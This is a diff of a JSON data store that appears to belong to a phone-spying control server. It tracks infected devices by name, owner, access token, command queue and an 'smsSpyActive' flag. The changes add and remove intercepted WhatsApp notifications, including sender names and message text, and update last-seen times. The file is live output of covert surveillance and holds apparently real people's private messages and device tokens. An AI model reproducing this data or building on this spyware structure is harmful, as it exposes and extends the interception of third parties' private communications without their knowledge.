@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781436168,
+    "lastSeen": 1776781448193,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2928 pesan dari 17 chat",
+        "time": "21/04 21:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781448362
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779878946
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (132 pesan): ~ JURAGAN RAIHAN MARKET OWNER CBN",
-        "content": "📷 STOK SG METEOR NIH JURAGAN F SPEK /OP? PM AJA JURAGAN✅",
-        "time": "21/04 20:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779878907
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781437590,
+    "lastSeen": 1776781448103,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781435342,
+    "lastSeen": 1776781447394,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "wduh",
+        "time": "21/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781438205
+      },
       {
         "appName": "WhatsApp",
         "sender": "kimm ade' an",
